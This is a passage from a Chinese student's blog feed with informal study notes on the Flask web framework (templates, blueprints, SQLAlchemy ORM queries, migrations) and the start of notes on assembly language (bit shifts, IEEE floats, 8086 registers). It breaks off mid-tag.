class="code"><pre><span class="line">response.headers[<span class="string">&quot;aaa&quot;</span>]=<span class="string">&quot;fff&quot;</span></span><br></pre></td></tr></table></figure><p>来在响应头里加一个参数</p><h3 id="response和request对象"><a href="#response和request对象" class="headerlink" title="response和request对象"></a>response和request对象</h3><p>上面那个应该是就response对象的用法但我不想改顺序了</p><p>那这里就讲request</p><p>直接在flask里面导入进来就好了（原来import里真的可以直接导对象啊）</p><p>request可以直接调用其中的变量</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>render_template(“xxx.html”)</p><p>这个方法是flask自带的，一直就有</p><p>里面的xxx.html是指在templates文件夹里面的名字</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210605203630.png"></p><h3 id="对于HTML里面有from表单的情况"><a href="#对于HTML里面有from表单的情况" class="headerlink" title="对于HTML里面有from表单的情况"></a>对于HTML里面有from表单的情况</h3><p>这个form表单里面的action属性</p><p>表示了提交以后要进入的路径</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">from</span> <span class="attr">action</span>=<span class="string">&quot;/xxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span> = <span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个name属性很重要，是你用来传参的地方</p><p>你可以通过request.args.get(‘username’)</p><p>直接吧你输入的值拿到 </p><p>而对于post方法</p><p>你首先要这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure><p>然后使用request.form.get(‘username’)</p><p>这样才可以</p><h3 id="补充：json"><a href="#补充：json" class="headerlink" title="补充：json"></a>补充：json</h3><p>这是个关于json用法的补充</p><p>json我之前一直没怎么学好</p><p>json是一个字符串格式，应该是属于字符串那个范围</p><p>在python中，列表变成json格式字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json_str = json.dumps(列表变量名)</span><br></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>重定向有个状态码302</p><p>302表示就是重定向，表示浏览器接收到了302，发现自己应该转一个地址，就直接转过去了，此时浏览器还要在发一个请求给服务器，表示我再要一个给之前重定向的那个url，请给我这个url的响应</p><p>在flask中，这个重定向是直接有一个redirect函数可以来使用，应该也是在flask里面自己就有的，都不需要换什么</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> redirect(<span class="string">&quot;要换的地址&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210605203700.png">        而redirect常常和url_for搭配起来使用</p><p>url_for 感觉也就是给一个很长的路径弄一个比较好记的小名</p><p>它也是一个flask自带的函数，可以直接用</p><p>用法是首先</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>],endpoint=<span class="string">&#x27;小名&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure><p>然后在你想用的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for(<span class="string">&#x27;小名&#x27;</span>)</span><br></pre></td></tr></table></figure><p>就好了</p><h3 id="模板的参数投递"><a href="#模板的参数投递" class="headerlink" title="模板的参数投递"></a>模板的参数投递</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template(<span class="string">&quot;你的HTML&quot;</span>，变量名= flask里面弄的变量名)</span><br></pre></td></tr></table></figure><p>在html里面就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;变量名&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个变量如果在flask里面没有就是空白字符串</p><p>这个我学过了所以不多讲了</p><p><strong>这里面的语法对于python的所有语法都适用</strong></p><p>顺便一说这些都是先在render_template里面，也就是jinjia2这个模板引擎里面进行了渲染，然后才开始return到浏览器的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">对列表：</span><br><span class="line">&#123;&#123;list.0&#125;&#125;或者&#123;&#123;list[0]&#125;&#125;</span><br><span class="line">字典：</span><br><span class="line">&#123;&#123;dic.item&#125;&#125;</span><br><span class="line">对象：</span><br><span class="line">&#123;&#123;对象.属性&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="语句块"><a href="#语句块" class="headerlink" title="语句块"></a>语句块</h4><p>循环的语句块：</p><p>if的语句块：</p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>过滤器就是一个函数，不过是在模板里定义的自带的函数，</p><p>用法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;变量名 | 过滤器（参数）&#125;&#125;</span><br></pre></td></tr></table></figure><p>参数可以有也可以没有</p><p>常用的过滤器：</p><p>safe、capitalize、upper、reverse、format、truncate</p><p>有字典的也有list的各种方法，基本上和python里面都差不多</p><p>在语句块里面也差不多，语句块里面可以直接使用方法    </p><h4 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h4><p>方法一：</p><p>app.add_template_filter(在app.py里面的函数名，“你想要使用时候用的名字”)</p><p>方法二：</p><p>使用装饰器，在这个定义的函数前面写一个</p><p>@app.template_filter(“你想要它叫的名字”)</p><h3 id="模板复用"><a href="#模板复用" class="headerlink" title="模板复用"></a>模板复用</h3><h4 id="模块继承"><a href="#模块继承" class="headerlink" title="模块继承"></a>模块继承</h4><p>要用一个语句块</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block 名字 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>就是说这几个都是这个HTML里面可以改的地方</p><p>然后开始继承</p><p>在子模板里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends ’index.html&#39; %&#125;</span><br></pre></td></tr></table></figure><p>这个index.html是你想要继承的那个html</p><p>然后你现在改的也就只有父本里面的那些block的地方</p><p>然后这个时候要注意是写的那个自己的名字</p><p>也就是说在子模板里面是只有</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block 名字 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>的形式的</p><h4 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h4><p>这是一个include</p><p>格式是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &#x27;文件夹/xxx.html&#x27;%&#125;</span><br></pre></td></tr></table></figure><p>这个方法适用于在A,B,C中有一些共同的部分，但其他页面没有这个部分</p><p>所以A,B,C里面直接include就好了</p><h4 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h4><p>宏有点像是python里面的函数，它的格式是这样的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro 函数名(变量)%&#125;</span><br><span class="line">。。。</span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure><p>这个我感觉和include也有那么一点像</p><p>也就是说我可以把这个macro也就是这个像函数一样的东西放在一个HTML文件里面，然后在其他文件里面引用它，格式为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import &#x27;文件路径名&#x27; as 别名 %&#125;</span><br><span class="line">&#123;&#123; 别名.方法(参数) &#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="引用static文件夹中的文件"><a href="#引用static文件夹中的文件" class="headerlink" title="引用static文件夹中的文件"></a>引用static文件夹中的文件</h3><p>这涉及到要使用url_for</p><p>我们可以知道之前说url_for是为了方便写各种各样的很长的路由，但是url_for还有其他用法</p><p>比如说在要引入css文件的时候，我们使用url_for</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123;url_for(&#x27;static&#x27;,filename = &#x27;css/style.css&#x27;)&#125;&#125;&quot;</span></span></span><br></pre></td></tr></table></figure><p>这个是在flask里面的一个默认规定，它表示直接引用了static文件夹里面的css文件夹中的style.css</p><p>它将static作为了url_for里面的一个特殊条件，这个条件后面必须要有filename, 将’css/style.css’变成非关键参数，使得关键参数只有‘static’这一个</p><h2 id="蓝图"><a href="#蓝图" class="headerlink" title="蓝图"></a>蓝图</h2><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><p>认识蓝图之前，我们首先要理清楚视图是个什么</p><p>视图就是在flask里面那些之前和路由联系在一起的函数，它们把路由连接起来返回数据传给浏览器</p><h3 id="蓝图是什么"><a href="#蓝图是什么" class="headerlink" title="蓝图是什么"></a>蓝图是什么</h3><p>蓝图是指将一些视图按照一些分类规矩分成的一个块</p><p>也就是说原本乱七八糟的视图函数们，在这里变成了稍微可以归类的一个个版块，里面有着一个个视图</p><p>蓝图对象连接着一些在一个主题里面的路由</p><p>通过蓝图对象注册在app对像来使得app对象中可以识别这些路由</p><h4 id="蓝图中的Flask-name"><a href="#蓝图中的Flask-name" class="headerlink" title="蓝图中的Flask(_ name _)"></a>蓝图中的Flask(_ <em>name</em> _)</h4><p>这个类的构造方法是把templates和static的路径设定好的，所以如果你是在做项目，需要把这个路径改一改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蓝图对象名称 = Flask(__name__,template_folder=<span class="string">&#x27;要改的路径&#x27;</span>,static_folder = <span class="string">&#x27;要改的路径&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="项目中的关于表的删除操作"><a href="#项目中的关于表的删除操作" class="headerlink" title="项目中的关于表的删除操作"></a>项目中的关于表的删除操作</h3><p>通过js代码可以进行删除</p><p>js中location对象 location.href=’替换的一个路由’，还可以把参数用get方法的形式放在里面</p><p>这就进入了一个新的视图函数，这样就可以在那个视图函数里面进行表的删减</p><h2 id="flask-script"><a href="#flask-script" class="headerlink" title="flask-script"></a>flask-script</h2><p>这个是用来和数据库做关系的一个模块</p><p>居然只能和flask1.1.2作一起使用，看来这个也是一件很老的东西了，唉，将就用吧</p><p>命令行中运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py runserver</span><br></pre></td></tr></table></figure><p> 这个命令行部分还可以自定义命令</p><p>在一个函数上面加上装饰器</p><p>@manager.command</p><p>就好了</p><h2 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h2><p>所谓ORM，指的是将数据库和类联系起来的一种映射关系</p><p>这个关系是</p><p>类&lt;———&gt;字段名</p><p>对象&lt;———-&gt;一条数据</p><p>将这个映射关系的使用，这就是ORM的作用</p><h3 id="在flask中与之相关的库"><a href="#在flask中与之相关的库" class="headerlink" title="在flask中与之相关的库"></a>在flask中与之相关的库</h3><h4 id="SQLALchemy"><a href="#SQLALchemy" class="headerlink" title="SQLALchemy"></a>SQLALchemy</h4><p>这个是一个关于实现我们所谓ORM关系的库，是基础</p><h4 id="flask-sqlalchemy"><a href="#flask-sqlalchemy" class="headerlink" title="flask-sqlalchemy"></a>flask-sqlalchemy</h4><p>这是基于SQLAlchemy的一个库，由于SQLAlchemy的复杂性，flask中将其做了一步简化，使其比较方便</p><h4 id="flask-migrate"><a href="#flask-migrate" class="headerlink" title="flask-migrate"></a>flask-migrate</h4><p>用于实现ORM映射的命令</p><h3 id="配置文件-1"><a href="#配置文件-1" class="headerlink" title="配置文件"></a>配置文件</h3><p>中间有一个和数据库进行连接的配置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLALCHEMY_DATABASE_URI=<span class="string">&#x27;mysql+pymysql://user:password@hostip:port/db_name&#x27;</span></span><br></pre></td></tr></table></figure><p>这里面的都是概念名字，用到了自己记得换</p><h3 id="app和ORM"><a href="#app和ORM" class="headerlink" title="app和ORM"></a>app和ORM</h3><h4 id="app和SQLAlchemy关联"><a href="#app和SQLAlchemy关联" class="headerlink" title="app和SQLAlchemy关联"></a>app和SQLAlchemy关联</h4><p>这两个是需要关联的东西，app对象和db=SQLAlchemy()对象进行关联：</p><p>db是在ext文件夹中实现</p><p>然后在apps的_ <em>init</em> _.py中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span>():</span></span><br><span class="line">    app = Flask(__name__,template_folder=<span class="string">&#x27;../templates&#x27;</span>,static_folder=<span class="string">&#x27;../static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    app.config.from_object(settings.DevelopmentConfig)</span><br><span class="line">    db.init_app(app) <span class="comment">#进行的绑定</span></span><br><span class="line">  </span><br><span class="line">    app.register_blueprint(user_bp)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意其中的顺序问题，一定要是先配置了文件，然后在对db进行和app的连接</p><h4 id="app和flask-migrate"><a href="#app和flask-migrate" class="headerlink" title="app和flask-migrate"></a>app和flask-migrate</h4><p>migrate对象是和app和db对象都产生关联了</p><p>（flask-migrate要是2.5.3版本才能弄MigrateCommand太离谱了）</p><p>在app.py中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">migrate = Migrate(app=app,db=db)</span><br><span class="line">manager.add_command(<span class="string">&#x27;db&#x27;</span>,MigrateCommand)</span><br></pre></td></tr></table></figure><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>model模型，也就是类，在model.py中</p><p>也就是是和表相对应的那个类，大概的格式是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line"> <span class="built_in">id</span> = db.column(db.Integer, primary_key=<span class="literal">True</span>,autoincrement = <span class="literal">True</span>)</span><br><span class="line">    username = db.column(db.String(<span class="number">15</span>), nullable = <span class="literal">False</span>)</span><br><span class="line">    password = db.column(db.String(<span class="number">12</span>), nullabe = <span class="literal">True</span>)</span><br><span class="line">    phone = db.column(db.String(<span class="number">11</span>), unique = <span class="literal">True</span>)</span><br><span class="line">    rdatetime = db.column(db.DateTime, default = datetime.now)</span><br></pre></td></tr></table></figure><p>使用命令：</p><ol><li>记得创建了模型以后要导入模型</li><li>在终端使用命令db init</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py db init</span><br></pre></td></tr></table></figure><p>会生成一个migration文件夹</p><p>再弄一个命令 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py db migrate</span><br></pre></td></tr></table></figure><p>要记得先把数据库打开啊</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py db upgrade</span><br></pre></td></tr></table></figure><p>顺便一说这样确定了之后如果只是对这个表的增删改查好像就已经可以不用打开数据库了</p><h4 id="db对象的一些方法"><a href="#db对象的一些方法" class="headerlink" title="db对象的一些方法"></a>db对象的一些方法</h4><p>db.session.add(模型)  添加一个模型进db对象的缓存里面（感觉是这个意思）</p><p>db.session.commit()   提交这个缓存</p><h4 id="关于对数据库的操作"><a href="#关于对数据库的操作" class="headerlink" title="关于对数据库的操作"></a>关于对数据库的操作</h4><p>对数据库的操作在flask里面就是对model类的对象和db对象的一些操作</p><p>我们数据库的创建是用了上面的upgrade命令</p><p>插入和查询操作就是直接</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.session.add()</span><br><span class="line">db.session.commit() <span class="comment">#添加行数据和提交</span></span><br><span class="line"></span><br><span class="line">User.query.<span class="built_in">all</span>()  <span class="comment">#查找这个表的所有</span></span><br><span class="line">User.query.filer_by(表中的参数名 = 函数中的参数名) <span class="comment">#查找你想要的行，返回的是一个列表，可以说这个列表里面都是一个个数据对象</span></span><br><span class="line">User.query.get(<span class="number">1</span>) <span class="comment">#按照主键来查询 返回一个用户对象</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User.qurey.<span class="built_in">filter</span>(User.username == <span class="string">&quot;想要查的变量&quot;</span>).<span class="built_in">all</span>() <span class="comment">#返回的是一个列表，列表里面是对象</span></span><br><span class="line">User.query.<span class="built_in">filter</span>(User.username.startswith(<span class="string">&#x27;z&#x27;</span>)).<span class="built_in">all</span>()</span><br><span class="line">User.query.<span class="built_in">filter</span>(User.username.endswith(<span class="string">&#x27;z&#x27;</span>)).<span class="built_in">all</span>()</span><br><span class="line">User.query.<span class="built_in">filter</span>(User.username.contains(<span class="string">&#x27;z&#x27;</span>)).<span class="built_in">all</span>()</span><br><span class="line">User.query.<span class="built_in">filter</span>(User.username.like(<span class="string">&#x27;z%&#x27;</span>)).<span class="built_in">all</span>()</span><br><span class="line">User.query.<span class="built_in">filter</span>(or_(User.username.startwith(<span class="string">&#x27;z&#x27;</span>),User.username.startwith(<span class="string">&#x27;z&#x27;</span>))).<span class="built_in">all</span>()</span><br><span class="line">User.query.<span class="built_in">filter</span>(and_(User.username.like(<span class="string">&#x27;z%&#x27;</span>),User.<span class="built_in">id</span>.__gt__(<span class="string">&#x27;2&#x27;</span>))).<span class="built_in">all</span>() <span class="comment"># id&gt;2 and username like &#x27;z% &#x27; 这个也可以直接用&gt; 和 &lt; 号的</span></span><br></pre></td></tr></table></figure><p>or_ 和and_ 都是要import的</p><p>排序：order_by</p><pre><code>user_list = User.query.filter(User.username.contains(&#39;z&#39;)).order_by(-User.rdatetime).all()  # 先筛选再排序user_list = User.query.order_by(-User.id).all()  对所有的进行排序注意：order_by(参数)：1。 直接是字符串： &#39;字段名&#39;  但是不能倒序2。 填字段名： 模型.字段    order_by(-模型.字段)  倒序</code></pre><p>限制： limit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit的使用 + offset</span><br><span class="line">user_list &#x3D; User.query.limit(2).all()   默认获取前两条</span><br><span class="line">user_list &#x3D; User.query.offset(2).limit(2).all()   跳过2条记录再获取两条记录</span><br></pre></td></tr></table></figure><h2 id="关于直接在前端对后端数据库的操作"><a href="#关于直接在前端对后端数据库的操作" class="headerlink" title="关于直接在前端对后端数据库的操作"></a>关于直接在前端对后端数据库的操作</h2><p>通过对标签的修改加上js的辅助，用JavaScript来使其进入另一个路由，在这个理由里面定义视图函数，用这个函数的返回值来表示响应</p><h2 id="表与表之间的关联"><a href="#表与表之间的关联" class="headerlink" title="表与表之间的关联"></a>表与表之间的关联</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Article</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    ...</span><br><span class="line">uer_id =  db.Column(db.Integer,db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>),nullable = Flase)</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    ...</span><br><span class="line">    articles = db.relationship(<span class="string">&#x27;Article&#x27;</span>,backref=<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>上面这个是一对多关系的时候需要用。表示一个user对应多个article</p><p>如果是多对多的关系的话，要注意：要弄一个第三方的表，这个表来方便将两张多对多关系的表实现连接</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flask&quot;&gt;&lt;a href=&quot;#flask&quot; class=&quot;headerlink&quot; title=&quot;flask&quot;&gt;&lt;/a&gt;flask&lt;/h1&gt;&lt;p&gt;这个是关于我们要做的项目的学习&lt;/p&gt;
&lt;p&gt;我们用了flask框架&lt;/p&gt;
&lt;h2 id=&quot;虚拟环境&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="教程" scheme="https://thanyi.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    <category term="flask" scheme="https://thanyi.github.io/categories/%E6%95%99%E7%A8%8B/flask/"/>
    
    
    <category term="技术" scheme="https://thanyi.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
    <category term="flask" scheme="https://thanyi.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言的学习</title>
    <link href="https://thanyi.github.io/2021/05/25/008%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://thanyi.github.io/2021/05/25/008%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-24T16:00:00.000Z</published>
    <updated>2021-05-25T14:30:35.152Z</updated>
    
    <content type="html"><![CDATA[<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="算数平移和逻辑平移"><a href="#算数平移和逻辑平移" class="headerlink" title="算数平移和逻辑平移"></a>算数平移和逻辑平移</h2><p>关于这个平移问题，分为算术左右移和逻辑左右移</p><h3 id="算术左移和逻辑左移："><a href="#算术左移和逻辑左移：" class="headerlink" title="算术左移和逻辑左移："></a>算术左移和逻辑左移：</h3><p>只要数字向左移动一位就好了，然后右边补0，其他都不用管</p><h3 id="算术右移和逻辑右移："><a href="#算术右移和逻辑右移：" class="headerlink" title="算术右移和逻辑右移："></a>算术右移和逻辑右移：</h3><p>逻辑右移是很正常的，也就是只要向右移动，补补0就好了</p><p><strong>而算术右移就不一样！</strong></p><p>只有算术右移，是让符号位一起走</p><ul><li>向右移动，并且补的是和符号位是一样的</li></ul><p>也就是说要不是全补0要不是全补1</p><h2 id="IEEE浮点数编码"><a href="#IEEE浮点数编码" class="headerlink" title="IEEE浮点数编码"></a>IEEE浮点数编码</h2><p>首先你要知道怎么是一个小数的十进制变二进制</p><p>但我觉得我已经知道了我就不讲了</p><h3 id="32位编码格式"><a href="#32位编码格式" class="headerlink" title="32位编码格式"></a>32位编码格式</h3><p>对于一个32位的浮点数，它的编码格式</p><p>在32位二进制串中，阶码部分用8位来存储，尾数部分用23位来存储，还有1位是符号位。</p><p>讲起来有点麻烦我直接上例子</p><p>例：12.25按照32位IEEE编码</p><ul><li>符号位</li></ul><p>12.25变成二进制：1100.01</p><p>因为是正数，符号位是0</p><ul><li>阶码</li></ul><p>阶码部分是这样的：</p><p>因为是1100.01，按照规则这是<br>$$<br>1.10001*2^3<br>$$<br>所以我们知道阶码数是127+3=130 （这是规定我也不知道为什么是这样）</p><p>130再变为二进制为：10000011</p><p>阶码也是8位，这个就是阶码</p><ul><li>尾数部分</li></ul><p>尾数是我们之前的<br>$$<br>1.10001*2^3<br>$$<br>中的小数点后面的部分：10001</p><p>又因为是 23位的尾数部分</p><p>所以是10001000000000000000000（共23位）</p><p>所以这个数是</p><p>0 10000011 10001000000000000000000</p><h3 id="32位编码格式-1"><a href="#32位编码格式-1" class="headerlink" title="32位编码格式"></a>32位编码格式</h3><p>64位的阶码是+1023</p><p>64位的编码部分是</p><p>1         11         52</p><h2 id="关于一个字节为什么是-128到127"><a href="#关于一个字节为什么是-128到127" class="headerlink" title="关于一个字节为什么是 -128到127"></a>关于一个字节为什么是 -128到127</h2><p>补码的好处：</p><p>首先加入没有补码，+0 在计算机中的表示0 000 0000. -0 在计算机中的表示1 000 0000. 并不一致。</p><p>如果采用补码-0 的补码就是 0 000 0000. 两者一致</p><p>其次我们知道8位二进制的表示形式总共有0000 0000-1111 1111 那么多，恰好是2^8=256. 也就是说理论上可以表示256个十进制数字。我们前面知道，-0 在计算机中如果再用原码 就是1 000 0000 。如果采用反码就是1 111 1111. 会多占用一个表达。</p><p>所以如果采用补码就可以把1 000 0000 这个表达空出来表示一个十进制数字。 很显然用它来表示-128 最为合理。</p><p>还可以从另外一个角度来理解： -127 的补码是1000 0001.再减去1 就是1000 0000 。那-127-1=-128.</p><p>所以补码的好处就是计算机的表达位数可以充分利用表示跟多的十进制数。</p><h2 id="关于汇编指令"><a href="#关于汇编指令" class="headerlink" title="关于汇编指令"></a>关于汇编指令</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>要学指令首先要弄懂这些寄存器</p><p>8086/8088 CPU的寄存器共有14个，都是16位的寄存器，根据用途分为<strong>数据寄存器</strong>、<strong>段寄存器</strong>、<strong>地址寄存器</strong>和<strong>控制寄存器</strong>4种类型。</p><p>不过太多了，我挑几个重要的讲：</p><ul><li>数据寄存器</li></ul><p>数据寄存器包括EAX、EBX、ECX 、EDX四个通用寄存器，用于存放计算过程中所用的操作数、结果等信息，即是存放数据的寄存器。</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210525115616.png"></p><ul><li><p>指针寄存器</p><p>这个就是指向的一些东西的寄存器</p><p>ESI：源变址寄存器，可用于存放源缓冲区的偏移地址。<br>EDI：目的变址寄存器，可用于存放目的缓冲区的偏移地址。<br>ESP：堆栈指针寄存器，用于指出堆栈区栈顶的偏移地址。<br>EBP：基址指针寄存器，用于指出堆栈区某个单元的偏移地址。</p></li><li><p>控制寄存器</p></li></ul><p>控制寄存器包括指令指针寄存器IP和标志寄存器FR，用来控制程序的执行。</p><ol><li><p>指令指针寄存器IP（Instruction Pointer）<br>指出当前正在执行指令的<strong>下一条指令</strong>所在单元的偏移地址。</p></li><li><p>标志寄存器FR（Flag Register）<br>标志寄存器FR共有有效标志位9个。</p><p>下面这些了解就好了</p><p><strong>状态标志：</strong></p><p>C：最高位产生借位或进位标志。进位C=1</p><p>O：溢出标志。溢出O=1</p><p>Z：零标志。结果为0则Z=1</p><p>S：符号标志。就是结果的符号位。</p><p>P：奇偶标志。低8位中1的个数为偶数P=1</p><p>A：辅助进位标志。低半字节向高半字节有进位或借位，A=1</p><p><strong>控制标志：</strong></p><p>D：方向标志。D=1时串操作时自动减量</p><p>I：中断标志。I=1时允许CPU接收外部的中断请求</p><p>T：陷阱标志。T=1时进入单步调试状态。</p></li></ol><h2 id="指令部分"><a href="#指令部分" class="headerlink" title="指令部分"></a>指令部分</h2><p>某些指令的差别就在会不会影响标志位或者会不会保存结果</p><h3 id="关于有些不好记的指令"><a href="#关于有些不好记的指令" class="headerlink" title="关于有些不好记的指令"></a>关于有些不好记的指令</h3><p>SHL（shift logical left）: 逻辑左移<br>        SAL  (shift arithmetic left )：算术左移<br>        SHR  (shift logical right)：逻辑右移<br>        SAR  (shift arithmetic right)：算术右移</p><p>ROL  (rotate left)：循环左移<br>        ROR  (rotate right)：循环右移<br>        RCL  (rotate left through carry)：带进位循环左移<br>        RCR  (rotate right through carry) ：带进位循环右移</p><h3 id="影响标志位"><a href="#影响标志位" class="headerlink" title="影响标志位"></a>影响标志位</h3><p>add和lec</p><p>sub和dec</p><p>这两个是前者影响标志位，后者不影响</p><h3 id="保存结果"><a href="#保存结果" class="headerlink" 